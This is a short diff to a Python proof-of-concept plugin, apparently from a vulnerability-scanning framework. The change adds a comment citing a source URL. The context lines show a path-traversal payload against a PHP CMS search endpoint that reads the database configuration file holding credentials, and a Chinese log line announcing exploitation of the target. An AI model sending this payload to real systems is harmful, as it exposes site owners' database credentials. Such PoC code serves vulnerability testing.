@@ -50,6 +50,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                     target=self.target, vuln=self.vuln))
 
+            #http://0day5.com/archives/194/
             payload = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php"
             verify_url = '{target}'.format(target=self.target)+payload
             REGX_DICT = {
